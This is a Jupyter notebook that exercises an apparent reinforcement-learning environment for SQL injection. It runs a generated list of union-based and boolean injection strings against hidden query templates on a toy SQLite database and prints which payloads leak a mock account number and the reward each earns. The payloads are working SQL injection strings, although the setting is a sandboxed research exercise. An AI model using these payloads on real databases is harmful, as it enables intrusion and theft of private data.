{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "id": "fdc6ae17",
   "metadata": {},
   "outputs": [],
   "source": [
    "import numpy as np\n",
    "from IPython.display import clear_output, display\n",
    "from tqdm import tqdm\n",
    "import environment\n",
    "import gym\n",
    "import structured.generate_actions as gen_acts"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "id": "f4a4653c",
   "metadata": {},
   "outputs": [],
   "source": [
    "env = gym.make('SQL-v1')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "id": "d2ddb3b4",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "''"
      ]
     },
     "execution_count": 3,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "actions = gen_acts.generate_actions()\n",
    "env.reset()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "id": "2086c3ec",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "SELECT id, username FROM users WHERE nationality=\"The Island{input}\"\n",
      "('5;123;', -0.1) |||| SELECT id, username FROM users WHERE nationality=\"The Island\"\n",
      "('', -0.1) |||| SELECT id, username FROM users WHERE nationality=\"The Island' and 1=1 --\"\n",
      "('', -0.1) |||| SELECT id, username FROM users WHERE nationality=\"The Island' and 1=2 --\"\n",
      "('', -0.1) |||| SELECT id, username FROM users WHERE nationality=\"The Island' union select NULL --\"\n",
      "('', -0.1) |||| SELECT id, username FROM users WHERE nationality=\"The Island' union select NULL, NULL --\"\n",
      "('', -0.1) |||| SELECT id, username FROM users WHERE nationality=\"The Island' union select NULL, NULL, NULL --\"\n",
      "('', -0.1) |||| SELECT id, username FROM users WHERE nationality=\"The Island' union select NULL, NULL, NULL, NULL --\"\n",
      "('', -0.1) |||| SELECT id, username FROM users WHERE nationality=\"The Island' union select NULL, NULL, NULL, NULL, NULL --\"\n",
      "('', -0.1) |||| SELECT id, username FROM users WHERE nationality=\"The Island' union select account from private --\"\n",
      "('', -0.1) |||| SELECT id, username FROM users WHERE nationality=\"The Island' union select account, NULL from private --\"\n",
      "('', -0.1) |||| SELECT id, username FROM users WHERE nationality=\"The Island' union select account, NULL, NULL from private --\"\n",
      "('', -0.1) |||| SELECT id, username FROM users WHERE nationality=\"The Island' union select account, NULL, NULL, NULL from private --\"\n",
      "('', -0.1) |||| SELECT id, username FROM users WHERE nationality=\"The Island' union select account, NULL, NULL, NULL, NULL from private --\"\n",
      "('5;123;', -0.1) |||| SELECT id, username FROM users WHERE nationality=\"The Island\" and 1=1 --\"\n",
      "('', -0.1) |||| SELECT id, username FROM users WHERE nationality=\"The Island\" and 1=2 --\"\n",
      "('ERROR', -1.0) |||| SELECT id, username FROM users WHERE nationality=\"The Island\" union select NULL --\"\n",
      "('None;None;5;123;', -0.1) |||| SELECT id, username FROM users WHERE nationality=\"The Island\" union select NULL, NULL --\"\n",
      "('ERROR', -1.0) |||| SELECT id, username FROM users WHERE nationality=\"The Island\" union select NULL, NULL, NULL --\"\n",
      "('ERROR', -1.0) |||| SELECT id, username FROM users WHERE nationality=\"The Island\" union select NULL, NULL, NULL, NULL --\"\n",
      "('ERROR', -1.0) |||| SELECT id, username FROM users WHERE nationality=\"The Island\" union select NULL, NULL, NULL, NULL, NULL --\"\n",
      "('ERROR', -1.0) |||| SELECT id, username FROM users WHERE nationality=\"The Island\" union select account from private --\"\n",
      "('5;123;accountnr:123456;None;', 99.9) |||| SELECT id, username FROM users WHERE nationality=\"The Island\" union select account, NULL from private --\"\n",
      "('ERROR', -1.0) |||| SELECT id, username FROM users WHERE nationality=\"The Island\" union select account, NULL, NULL from private --\"\n",
      "('ERROR', -1.0) |||| SELECT id, username FROM users WHERE nationality=\"The Island\" union select account, NULL, NULL, NULL from private --\"\n",
      "('ERROR', -1.0) |||| SELECT id, username FROM users WHERE nationality=\"The Island\" union select account, NULL, NULL, NULL, NULL from private --\"\n",
      "('', -0.1) |||| SELECT id, username FROM users WHERE nationality=\"The Island and 1=1 --\"\n",
      "('', -0.1) |||| SELECT id, username FROM users WHERE nationality=\"The Island and 1=2 --\"\n",
      "('', -0.1) |||| SELECT id, username FROM users WHERE nationality=\"The Island union select NULL --\"\n",
      "('', -0.1) |||| SELECT id, username FROM users WHERE nationality=\"The Island union select NULL, NULL --\"\n",
      "('', -0.1) |||| SELECT id, username FROM users WHERE nationality=\"The Island union select NULL, NULL, NULL --\"\n",
      "('', -0.1) |||| SELECT id, username FROM users WHERE nationality=\"The Island union select NULL, NULL, NULL, NULL --\"\n",
      "('', -0.1) |||| SELECT id, username FROM users WHERE nationality=\"The Island union select NULL, NULL, NULL, NULL, NULL --\"\n",
      "('', -0.1) |||| SELECT id, username FROM users WHERE nationality=\"The Island union select account from private --\"\n",
      "('', -0.1) |||| SELECT id, username FROM users WHERE nationality=\"The Island union select account, NULL from private --\"\n",
      "('', -0.1) |||| SELECT id, username FROM users WHERE nationality=\"The Island union select account, NULL, NULL from private --\"\n",
      "('', -0.1) |||| SELECT id, username FROM users WHERE nationality=\"The Island union select account, NULL, NULL, NULL from private --\"\n",
      "('', -0.1) |||| SELECT id, username FROM users WHERE nationality=\"The Island union select account, NULL, NULL, NULL, NULL from private --\"\n"
     ]
    }
   ],
   "source": [
    "print(env.hidden_query)\n",
    "for action in actions:\n",
    "    #print(env.step(action)[1],\"||||\", env.hidden_query.format(input = action))\n",
    "    print(env.step(action)[:2],\"||||\", env.hidden_query.format(input = action))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "id": "2b0f51c0",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "SELECT id, username, firstname FROM users WHERE firstname='Bob{input}'\n",
      "('5;123;Bob;', -0.1) |||| SELECT id, username, firstname FROM users WHERE firstname='Bob'\n",
      "('5;123;Bob;', -0.1) |||| SELECT id, username, firstname FROM users WHERE firstname='Bob' and 1=1 --'\n",
      "('', -0.1) |||| SELECT id, username, firstname FROM users WHERE firstname='Bob' and 1=2 --'\n",
      "('ERROR', -1.0) |||| SELECT id, username, firstname FROM users WHERE firstname='Bob' union select NULL --'\n",
      "('ERROR', -1.0) |||| SELECT id, username, firstname FROM users WHERE firstname='Bob' union select NULL, NULL --'\n",
      "('None;None;None;5;123;Bob;', -0.1) |||| SELECT id, username, firstname FROM users WHERE firstname='Bob' union select NULL, NULL, NULL --'\n",
      "('ERROR', -1.0) |||| SELECT id, username, firstname FROM users WHERE firstname='Bob' union select NULL, NULL, NULL, NULL --'\n",
      "('ERROR', -1.0) |||| SELECT id, username, firstname FROM users WHERE firstname='Bob' union select NULL, NULL, NULL, NULL, NULL --'\n",
      "('ERROR', -1.0) |||| SELECT id, username, firstname FROM users WHERE firstname='Bob' union select account from private --'\n",
      "('ERROR', -1.0) |||| SELECT id, username, firstname FROM users WHERE firstname='Bob' union select account, NULL from private --'\n",
      "('5;123;Bob;accountnr:123456;None;None;', 99.9) |||| SELECT id, username, firstname FROM users WHERE firstname='Bob' union select account, NULL, NULL from private --'\n",
      "('ERROR', -1.0) |||| SELECT id, username, firstname FROM users WHERE firstname='Bob' union select account, NULL, NULL, NULL from private --'\n",
      "('ERROR', -1.0) |||| SELECT id, username, firstname FROM users WHERE firstname='Bob' union select account, NULL, NULL, NULL, NULL from private --'\n",
      "('', -0.1) |||| SELECT id, username, firstname FROM users WHERE firstname='Bob\" and 1=1 --'\n",
      "('', -0.1) |||| SELECT id, username, firstname FROM users WHERE firstname='Bob\" and 1=2 --'\n",
      "('', -0.1) |||| SELECT id, username, firstname FROM users WHERE firstname='Bob\" union select NULL --'\n",
      "('', -0.1) |||| SELECT id, username, firstname FROM users WHERE firstname='Bob\" union select NULL, NULL --'\n",
      "('', -0.1) |||| SELECT id, username, firstname FROM users WHERE firstname='Bob\" union select NULL, NULL, NULL --'\n",
      "('', -0.1) |||| SELECT id, username, firstname FROM users WHERE firstname='Bob\" union select NULL, NULL, NULL, NULL --'\n",
      "('', -0.1) |||| SELECT id, username, firstname FROM users WHERE firstname='Bob\" union select NULL, NULL, NULL, NULL, NULL --'\n",
      "('', -0.1) |||| SELECT id, username, firstname FROM users WHERE firstname='Bob\" union select account from private --'\n",
      "('', -0.1) |||| SELECT id, username, firstname FROM users WHERE firstname='Bob\" union select account, NULL from private --'\n",
      "('', -0.1) |||| SELECT id, username, firstname FROM users WHERE firstname='Bob\" union select account, NULL, NULL from private --'\n",
      "('', -0.1) |||| SELECT id, username, firstname FROM users WHERE firstname='Bob\" union select account, NULL, NULL, NULL from private --'\n",
      "('', -0.1) |||| SELECT id, username, firstname FROM users WHERE firstname='Bob\" union select account, NULL, NULL, NULL, NULL from private --'\n",
      "('', -0.1) |||| SELECT id, username, firstname FROM users WHERE firstname='Bob and 1=1 --'\n",
      "('', -0.1) |||| SELECT id, username, firstname FROM users WHERE firstname='Bob and 1=2 --'\n",
      "('', -0.1) |||| SELECT id, username, firstname FROM users WHERE firstname='Bob union select NULL --'\n",
      "('', -0.1) |||| SELECT id, username, firstname FROM users WHERE firstname='Bob union select NULL, NULL --'\n",
      "('', -0.1) |||| SELECT id, username, firstname FROM users WHERE firstname='Bob union select NULL, NULL, NULL --'\n",
      "('', -0.1) |||| SELECT id, username, firstname FROM users WHERE firstname='Bob union select NULL, NULL, NULL, NULL --'\n",
      "('', -0.1) |||| SELECT id, username, firstname FROM users WHERE firstname='Bob union select NULL, NULL, NULL, NULL, NULL --'\n",
      "('', -0.1) |||| SELECT id, username, firstname FROM users WHERE firstname='Bob union select account from private --'\n",
      "('', -0.1) |||| SELECT id, username, firstname FROM users WHERE firstname='Bob union select account, NULL from private --'\n",
      "('', -0.1) |||| SELECT id, username, firstname FROM users WHERE firstname='Bob union select account, NULL, NULL from private --'\n",
      "('', -0.1) |||| SELECT id, username, firstname FROM users WHERE firstname='Bob union select account, NULL, NULL, NULL from private --'\n",
      "('', -0.1) |||| SELECT id, username, firstname FROM users WHERE firstname='Bob union select account, NULL, NULL, NULL, NULL from private --'\n"
     ]
    }
   ],
   "source": [
    "env.reset()\n",
    "print(env.hidden_query)\n",
    "for action in actions:\n",
    "    #print(env.step(action)[1],\"||||\", env.hidden_query.format(input = action))\n",
    "    print(env.step(action)[:2],\"||||\", env.hidden_query.format(input = action))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "id": "385a979d",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "SELECT id FROM users WHERE firstname='Bob{input}'\n",
      "('5;', -0.1) |||| \n",
      "('5;', -0.1) |||| ' and 1=1 --\n",
      "('', -0.1) |||| ' and 1=2 --\n",
      "('None;5;', -0.1) |||| ' union select NULL --\n",
      "('ERROR', -1.0) |||| ' union select NULL, NULL --\n",
      "('ERROR', -1.0) |||| ' union select NULL, NULL, NULL --\n",
      "('ERROR', -1.0) |||| ' union select NULL, NULL, NULL, NULL --\n",
      "('ERROR', -1.0) |||| ' union select NULL, NULL, NULL, NULL, NULL --\n",
      "('5;accountnr:123456;', 99.9) |||| ' union select account from private --\n",
      "('ERROR', -1.0) |||| ' union select account, NULL from private --\n",
      "('ERROR', -1.0) |||| ' union select account, NULL, NULL from private --\n",
      "('ERROR', -1.0) |||| ' union select account, NULL, NULL, NULL from private --\n",
      "('ERROR', -1.0) |||| ' union select account, NULL, NULL, NULL, NULL from private --\n",
      "('', -0.1) |||| \" and 1=1 --\n",
      "('', -0.1) |||| \" and 1=2 --\n",
      "('', -0.1) |||| \" union select NULL --\n",
      "('', -0.1) |||| \" union select NULL, NULL --\n",
      "('', -0.1) |||| \" union select NULL, NULL, NULL --\n",
      "('', -0.1) |||| \" union select NULL, NULL, NULL, NULL --\n",
      "('', -0.1) |||| \" union select NULL, NULL, NULL, NULL, NULL --\n",
      "('', -0.1) |||| \" union select account from private --\n",
      "('', -0.1) |||| \" union select account, NULL from private --\n",
      "('', -0.1) |||| \" union select account, NULL, NULL from private --\n",
      "('', -0.1) |||| \" union select account, NULL, NULL, NULL from private --\n",
      "('', -0.1) |||| \" union select account, NULL, NULL, NULL, NULL from private --\n",
      "('', -0.1) ||||  and 1=1 --\n",
      "('', -0.1) ||||  and 1=2 --\n",
      "('', -0.1) ||||  union select NULL --\n",
      "('', -0.1) ||||  union select NULL, NULL --\n",
      "('', -0.1) ||||  union select NULL, NULL, NULL --\n",
      "('', -0.1) ||||  union select NULL, NULL, NULL, NULL --\n",
      "('', -0.1) ||||  union select NULL, NULL, NULL, NULL, NULL --\n",
      "('', -0.1) ||||  union select account from private --\n",
      "('', -0.1) ||||  union select account, NULL from private --\n",
      "('', -0.1) ||||  union select account, NULL, NULL from private --\n",
      "('', -0.1) ||||  union select account, NULL, NULL, NULL from private --\n",
      "('', -0.1) ||||  union select account, NULL, NULL, NULL, NULL from private --\n"
     ]
    }
   ],
   "source": [
    "env.reset()\n",
    "print(env.hidden_query)\n",
    "for action in actions:\n",
    "    #print(env.step(action)[1],\"||||\", env.hidden_query.format(input = action))\n",
    "    print(env.step(action)[:2],\"||||\", action)\n",
    "    #print(env.step(action)[:2],\"||||\", env.hidden_query.format(input = action))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "id": "e4a12cbd",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "[(1, 'admin', 'admin', 'admin', 78, 'IT', '1994-11-02'),\n",
       " (2, 'dricci', 'dian', 'ricci', 12345, 'AI', '2021-02-02'),\n",
       " (3, 'amason', 'anthony', 'mason', 45, 'Middle earth', '1301-02-02'),\n",
       " (4, 'svargas', 'sandra', 'vargas', 19, 'Earth', '2040-01-01'),\n",
       " (5, '123', 'Bob', '123', 33, 'The Island', '3011-01-01')]"
      ]
     },
     "execution_count": 7,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "env.cursor.execute(\"select * from users\")\n",
    "env.cursor.fetchall()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "id": "6b9f758a",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "[(0, 'id', 'INTEGER', 0, None, 1),\n",
       " (1, 'username', 'TEXT', 0, None, 0),\n",
       " (2, 'firstname', 'TEXT', 0, None, 0),\n",
       " (3, 'surname', 'TEXT', 0, None, 0),\n",
       " (4, 'age', 'INT', 0, None, 0),\n",
       " (5, 'nationality', 'TEXT', 0, None, 0),\n",
       " (6, 'created_at', 'TEXT', 0, None, 0)]"
      ]
     },
     "execution_count": 8,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "env.cursor.execute('PRAGMA TABLE_INFO(users)')\n",
    "env.cursor.fetchall()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "d4d5dafe",
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.8.8"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
